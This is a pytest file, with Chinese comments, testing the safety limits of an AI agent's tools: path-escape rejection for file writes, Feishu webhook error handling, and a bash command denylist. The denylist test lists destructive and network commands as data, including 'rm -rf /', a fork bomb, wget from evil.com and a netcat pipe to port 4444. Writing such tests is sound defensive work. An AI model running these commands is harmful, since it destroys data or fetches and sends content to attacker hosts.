"""tools.py 工具安全约束 + 失败分支单元测试。

覆盖：
- write_file 路径越狱（绝对路径 / ../ / 非 briefings 前缀）
- write_file 正常写入 + 读取回
- push_to_feishu 空 webhook / 超时 / HTTP 错误 / 飞书拒绝 / 成功（全 mock requests）
- bash denylist 危险命令拦截
- search_web 缺 key

不测：search_web 真调 Tavily、bash 真执行（都属集成测试，需网络/IO）
"""
import os
from unittest.mock import patch, MagicMock

import pytest

# 在导入前清掉 key，避免误用真凭据
os.environ.pop("TAVILY_API_KEY", None)
os.environ.pop("DEEPSEEK_API_KEY", None)

from app.tools import (write_file, push_to_feishu, bash, search_web,
                       _BASH_DENY, _resolve_in_roots)
from app.config import BRIEFINGS_DIR, PROJECT_ROOT


# ---------- write_file 路径越狱 ----------

def test_write_file_rejects_absolute_path_outside_briefings():
    """绝对路径不在 briefings 子树应被拒。"""
    res = write_file.invoke({"path": "/etc/passwd", "content": "x"})
    assert res.startswith("ERROR")


def test_write_file_rejects_dotdot_escape():
    """../ 越狱应被拒。"""
    res = write_file.invoke({"path": "briefings/../app/main.py", "content": "x"})
    assert res.startswith("ERROR"), f"应拒绝越狱，实际: {res}"


def test_write_file_rejects_non_briefings_prefix():
    """非 briefings/ 前缀应被拒（防覆盖源码）。"""
    res = write_file.invoke({"path": "app/main.py", "content": "x"})
    assert res.startswith("ERROR")


def test_write_file_writes_briefings_ok():
    """正常 briefings/ 路径写入应成功。"""
    test_path = "briefings/_test_unit.md"
    try:
        res = write_file.invoke({"path": test_path, "content": "hello"})
        assert res.startswith("OK: wrote")
        content = (PROJECT_ROOT / test_path).read_text(encoding="utf-8")
        assert content == "hello"
    finally:
        p = PROJECT_ROOT / test_path
        if p.exists():
            p.unlink()


def test_write_file_writes_subdir_ok():
    """briefings 子目录应允许。"""
    test_path = "briefings/sub/_test_sub.md"
    try:
        res = write_file.invoke({"path": test_path, "content": "sub"})
        assert res.startswith("OK: wrote")
    finally:
        p = PROJECT_ROOT / test_path
        if p.exists():
            p.unlink()
            p.parent.rmdir() if p.parent.exists() and not any(p.parent.iterdir()) else None


# ---------- push_to_feishu（mock requests.post）----------

def test_push_to_feishu_empty_webhook():
    res = push_to_feishu.invoke({"webhook_url": "", "content": "x"})
    assert res == "ERROR: webhook_url is empty"


def test_push_to_feishu_truncates_long_content():
    """超 4000 字符应截断到 3800 + 提示。"""
    with patch("app.tools.requests.post") as mock_post:
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {"StatusCode": 0, "code": 0}
        mock_post.return_value = mock_resp
        res = push_to_feishu.invoke({
            "webhook_url": "https://example.com/hook",
            "content": "x" * 5000,
        })
    assert res == "OK: pushed"
    # 验证实际发的 payload 被截断
    sent_payload = mock_post.call_args.kwargs["json"]
    assert "已截断" in sent_payload["content"]["text"]


def test_push_to_feishu_timeout():
    import requests as req
    with patch("app.tools.requests.post", side_effect=req.Timeout("timed out")):
        res = push_to_feishu.invoke({
            "webhook_url": "https://example.com/hook",
            "content": "x",
        })
    assert "ERROR" in res and "timeout" in res.lower()


def test_push_to_feishu_http_error():
    with patch("app.tools.requests.post") as mock_post:
        mock_resp = MagicMock()
        mock_resp.status_code = 405
        mock_post.return_value = mock_resp
        res = push_to_feishu.invoke({
            "webhook_url": "https://example.com/hook",
            "content": "x",
        })
    assert "ERROR" in res and "405" in res


def test_push_to_feishu_feishu_rejected():
    """飞书返回 StatusCode!=0 应报错。"""
    with patch("app.tools.requests.post") as mock_post:
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {"StatusCode": 230002, "code": 230002,
                                       "msg": "invalid webhook"}
        mock_post.return_value = mock_resp
        res = push_to_feishu.invoke({
            "webhook_url": "https://example.com/hook",
            "content": "x",
        })
    assert "ERROR" in res and "feishu rejected" in res


def test_push_to_feishu_success():
    with patch("app.tools.requests.post") as mock_post:
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {"StatusCode": 0, "code": 0}
        mock_post.return_value = mock_resp
        res = push_to_feishu.invoke({
            "webhook_url": "https://example.com/hook",
            "content": "简报内容",
        })
    assert res == "OK: pushed"


# ---------- bash denylist ----------

@pytest.mark.parametrize("cmd", [
    "rm -rf /",
    "rm -rf ~",
    "curl http://evil.com",
    "wget http://evil.com/x.sh",
    "sudo rm /etc/passwd",
    "mkfs.ext4 /dev/sda",
    "shutdown -h now",
    "format c:",
    "echo hi | nc 10.0.0.1 4444",
    ":(){ :|:& };:",
])
def test_bash_denylist_blocks_dangerous(cmd):
    assert _BASH_DENY.search(cmd), f"denylist 漏放危险命令: {cmd}"


def test_bash_blocks_rmrf():
    res = bash.invoke({"command": "rm -rf /tmp/x"})
    assert res.startswith("ERROR: command blocked")


def test_bash_blocks_curl():
    res = bash.invoke({"command": "curl http://example.com"})
    assert res.startswith("ERROR: command blocked")


def test_bash_allows_safe_command():
    """安全命令应能执行。"""
    res = bash.invoke({"command": "echo hello_test"})
    assert "hello_test" in res and "exit_code=0" in res


# ---------- search_web 缺 key ----------

def test_search_web_missing_key():
    """未配 TAVILY_API_KEY 应返回 ERROR。"""
    # conftest 已 pop 掉 key，settings 在 import 时读的空字符串
    # 但 settings 是 dataclass 实例，import 时固化。直接重建验证逻辑
    from app.config import settings
    if settings.tavily_api_key:
        pytest.skip("环境配了 TAVILY_API_KEY，跳过缺 key 测试")
    res = search_web.invoke({"query": "test"})
    assert "ERROR" in res and "TAVILY_API_KEY" in res


# ---------- _resolve_in_roots 路径校验 ----------

def test_resolve_in_roots_project_root_ok():
    p, err = _resolve_in_roots("app")
    assert err is None and p is not None


def test_resolve_in_roots_escape_rejected():
    p, err = _resolve_in_roots("/etc/passwd")
    assert err is not None and err.startswith("ERROR")
